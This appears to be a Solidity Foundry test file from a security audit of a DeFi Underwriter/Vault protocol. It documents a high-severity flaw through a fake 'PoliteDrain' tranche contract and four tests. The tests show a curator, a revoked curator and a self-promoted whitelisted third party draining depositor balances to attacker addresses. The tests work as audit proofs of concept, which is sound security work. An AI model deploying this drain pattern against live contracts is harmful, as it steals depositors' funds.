// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import { Underwriter } from "../../../../../contracts/cap/Underwriter.sol";
import { IVault } from "../../../../../contracts/interfaces/IVault.sol";
import { CapDeployer } from "../../../../../test/shared/CapDeployer.sol";
import { CapRoles } from "../../../../../test/shared/CapRoles.sol";

/// Fake tranche that answers what `removeTranche`/`_mark` may call, so it is removable too.
contract PoliteDrain {
    function optIn() external { }

    function balanceOf(address) external pure returns (uint256) {
        return 0;
    }

    function convertToAssets(uint256) external pure returns (uint256) {
        return 0;
    }

    function claim(address) external pure returns (uint256) {
        return 0;
    }

    function pull(address vault, address from, address asset, address to) external returns (uint256 moved) {
        moved = IVault(vault).balanceOf(from, asset);
        IVault(vault).transferFrom(from, to, asset, moved);
    }
}

/// Round-3 port of round-2 R2-H1 (verify/R2-HIGH-CURATOR-DRAIN). HEAD `Underwriter.addTranche`
/// (:90-100) still has no registry provenance check: the NatSpec now says "curator is trusted to
/// name a real protocol tranche". `addTranche` is in the curator's selectors
/// (Registry.sol:499-504). Under the round-3 stance (curators are third parties) this is the
/// same defect. API changes only: `registry.operatorRole` -> harness `_operatorRoleOf`,
/// `previewRedeem` stub -> `convertToAssets`.
contract R2_H1_CuratorDrain is CapDeployer {
    Underwriter uw;
    address alice = makeAddr("alice");
    address thief = makeAddr("thief");

    function setUp() public {
        _deployCap();
        uw = _deployUnderwriter(); // production path: registry.createUnderwriter, curator == this
        _fundUnderwriter(address(uw), alice, 1_000e18);
    }

    function test_curatorDrainsIdleBalanceViaAddTranche() public {
        PoliteDrain d = new PoliteDrain();
        uw.addTranche(address(d));
        assertTrue(vault.isOperator(address(uw), address(d)), "fake is a Vault operator over the underwriter");
        uint256 moved = d.pull(address(vault), address(uw), address(collateral), thief);
        emit log_named_uint("drained (tokens)", moved);
        emit log_named_uint("alice shares now quote", uw.convertToAssets(uw.balanceOf(alice)));
        assertEq(moved, 0, "a curator must not be able to move depositor balances");
    }

    function test_stubbedFakeIsRemovableAfterDrain() public {
        PoliteDrain d = new PoliteDrain();
        uw.addTranche(address(d));
        d.pull(address(vault), address(uw), address(collateral), thief);
        uw.removeTranche(address(d));
        assertFalse(vault.isOperator(address(uw), address(d)));
        assertEq(uw.totalAssets(), 0, "loss is unchanged by revocation");
    }

    function test_roleRevocationDoesNotClearVaultOperatorFlag() public {
        PoliteDrain d = new PoliteDrain();
        uw.addTranche(address(d));
        uint64 role = _operatorRoleOf(address(this));
        accessManager.revokeRole(role, address(this)); // role admin is GOVERNOR = this
        vm.expectRevert();
        uw.removeTranche(address(d));
        assertTrue(vault.isOperator(address(uw), address(d)), "grant persists after role revocation");
        uint256 moved = d.pull(address(vault), address(uw), address(collateral), thief);
        assertEq(moved, 1_000e18, "fake still drains after the curator is fired");
    }

    /// Third-party stance: a WHITELISTED address needs no protocol role beyond WHITELISTED to mint
    /// itself a curator role (`createChildRoles`, Registry.sol:116-134, any parent), deploy an
    /// underwriter under it and drain whoever it admits.
    function test_whitelistedThirdPartyBuildsItsOwnCurator() public {
        address attacker = makeAddr("attacker");
        address victim = makeAddr("victim");
        accessManager.grantRole(CapRoles.WHITELISTED, attacker, 0);

        address[][] memory members = new address[][](2);
        members[0] = new address[](1);
        members[0][0] = attacker;
        members[1] = new address[](1);
        members[1][0] = victim;
        vm.prank(attacker);
        uint64[] memory roles = registry.createChildRoles(CapRoles.WHITELISTED, members);
        vm.prank(attacker);
        Underwriter own = Underwriter(registry.createUnderwriter(address(collateral), "Own", "OWN", roles[0]));
        vm.prank(attacker);
        own.setDepositorRole(roles[1]);

        _fundVault(victim, 500e18);
        vm.startPrank(victim);
        vault.setOperator(address(own), true);
        own.deposit(500e18, victim);
        vm.stopPrank();

        PoliteDrain d = new PoliteDrain();
        vm.prank(attacker);
        own.addTranche(address(d));
        uint256 moved = d.pull(address(vault), address(own), address(collateral), attacker);
        emit log_named_uint("third-party curator drained", moved);
        assertEq(moved, 0, "a WHITELISTED third party must not be able to custody depositor balances");
    }
}
